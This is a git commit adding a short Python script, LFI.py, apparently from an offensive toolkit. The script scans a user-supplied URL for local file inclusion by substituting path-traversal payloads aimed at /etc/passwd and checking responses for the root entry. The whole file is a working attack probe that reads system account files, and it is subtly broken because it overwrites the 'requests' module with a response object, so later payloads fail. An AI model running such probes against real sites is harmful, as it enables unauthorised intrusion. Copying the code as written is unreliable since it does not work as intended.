d5d74f45212bb84b6123f4e25bf859f06be26512
DeathCreator94 <93936265+DeathCreator94@users.noreply.github.com>
2022-03-16 17:23:32 +0100

    Create LFI.py

---
+++ Knock Knock/LFI.py
@@ -0,0 +1,25 @@
+import requests
+import sys
+
+
+def main():
+	if len(sys.argv) < 2:
+		sys.exit("[-]ERROR - Missing target URL")
+	elif not '{fuzz}' in sys.argv[1]:
+		sys.exit("[-]ERROR - Missing {fuzz} parameter\nExemple : http://127.168.0.1/index.php?image=\{fuzz\}")
+	else:
+		selected_target = sys.argv[1]
+
+	payloads = ['/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd']
+
+	for payload in payloads:
+		target = selected_target.replace('{fuzz}', payload)
+		requests = requests.get(target)
+		if b"root:x:0" in requests.content:
+			print("[+]SUCCESS - LFI vuln found with {}!".format(payload))
+		else:
+			pass
+	print("[+]INFO - Scan finished")
+
+if __name__ == '__main__':
+	main()
